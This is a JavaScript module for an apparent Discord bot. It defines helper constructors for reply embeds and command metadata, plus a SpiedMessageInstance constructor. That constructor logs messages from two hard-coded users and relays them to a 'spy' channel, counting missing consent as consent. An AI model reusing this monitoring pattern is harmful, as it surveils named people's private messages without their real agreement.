import db from "../Main/db.js";
import client from "../Main/client.js";


function SpiedMessageInstance(msg, time) {

    let timeArgs = time.toString().split(' ');
    let actualTime = `${timeArgs[0]} ${timeArgs[1]} ${timeArgs[2]} ${timeArgs[3]} ${timeArgs[4]}`

    if (msg.author.id === '726735174229819392') this.author = 'Mueed';
    if (msg.author.id === '949310364565274644') this.author = 'Saira'

    this.messageContent = msg.content;
    this.channel = msg.channel.name;
    this.timeStamp = actualTime;

    this.registerMessage = async function(person) {

        let messages = await db.get(`${person}_db_messages`);
        messages.push(this);
        await db.set(`${person}_db_messages`, messages);

    }

    this.send = async function(person) {

        let consent = await db.get(`${person}_consent`);

        const spyChannel = client.channels.cache.get("954838298088583219");
        if (consent == true || consent == null) spyChannel.send(`${person}: \` ${this.messageContent} \``)

    }

}

import ariaSuccess from "../Embeds/success.js";
import ariaError from "../Embeds/error.js";
import ariaHelp from "../Embeds/help.js";


function AriaSuccess (successTitle, description, parentCommandMeta, successStatusCode, authorId) {

    this.title = successTitle;
    this.description = description;
    this.command = parentCommandMeta.name;
    this.num = successStatusCode;
    this.id = authorId;

    this.send = function (msg, successEmbedImport) {
        msg.channel.send({embeds: [ariaSuccess(this, msg.author)]})
    }

    this.log = function () {
        console.log(this)
    }

    Object.keys(this).forEach((key) => {
        if (this[key] === '<VOID>') this[key] = '';
    });


}

function AriaError (errorStatusCode, codeName, errorTitle, errorDescription, helpCommand) {

    /**
     * @name AriaError
     * @description Constructs an ARIA Engine style error object to be sent in chat through the MessageEmbed constructor. Use `this.send(msg)` to send this error.
     * @param errorStatusCode {number} Error code in http error code convention.
     * @param codeName {string} String type name of code (404 => NOT_FOUND).
     * @param errorTitle {string} Short title that describes the error.
     * @param errorDescription {string} Brief description of the encountered error.
     * @param helpCommand {string} Help command for the command.
     * @returns {object} Object with ARIA Engine error convention properties.
     */

    this.num = errorStatusCode;
    this.code = codeName;
    this.name = errorTitle;
    this.value = errorDescription;
    this.help = helpCommand;

    this.send = function (msg) {
        msg.channel.send({embeds: [ariaError(this, msg.author)]})
    }

    this.log = function() {
        console.log(this)
    }

}

function AriaMeta (commandName, commandDescription, commandSyntax, commandHelp, commandCategory, commandParameters, timeout, requiredDiscordPermissions, commandVersion, additionalComments) {

    /**
     * @name AriaMeta
     * @param commandName {string} Command's name
     * @param commandDescription {string} Description of what the command does.
     * @param commandSyntax {string} Standard syntax of what the command does. Eg ` [Prefix] doSomething [arg1] keyWord [arg2] `.
     * @param commandHelp {string} Help command to provoke to obtain the command's help.
     * @param commandCategory {string} Command's category.
     * @param commandParameters {array} List of parameters the command accepts.
     */

    if (!Array.isArray(commandParameters)) throw "parameter commandArguments must by type of Array";

    this.name = commandName;
    this.description = commandDescription;
    this.syntax = commandSyntax;
    this.help = commandHelp;
    this.category = commandCategory;
    this.timeout = timeout;
    this.perms = requiredDiscordPermissions;
    this.params = commandParameters

    if (commandVersion) this.version = commandVersion;
    if (additionalComments) this.comm = additionalComments;

    this.executeHelp = function (msg) {
        return msg.channel.send({embeds: [ariaHelp(this, msg.author)]})
    }

    this.log = function () {
        console.log(this)
    }

}

export {SpiedMessageInstance, AriaMeta, AriaError, AriaSuccess}